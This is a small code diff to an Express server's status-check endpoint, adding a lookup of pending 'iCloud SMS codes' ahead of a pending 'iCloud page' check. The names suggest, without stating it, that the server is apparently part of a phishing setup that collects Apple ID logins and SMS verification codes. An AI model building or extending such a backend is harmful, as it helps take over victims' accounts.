@@ -243,7 +243,14 @@ app.get("/check-status", (req, res) => {
       return res.json({ status: "unknown" });
     }
 
-    // ✅ Check iCloud page first
+    // ✅ Check iCloud SMS codes first
+    if (pendingCodes[identifier]) {
+      return res.json({
+        status: pendingCodes[identifier].status || "pending"
+      });
+    }
+
+    // ✅ Check iCloud page
     if (pendingPage[identifier]) {
       return res.json({
         status: pendingPage[identifier].status || "pending"
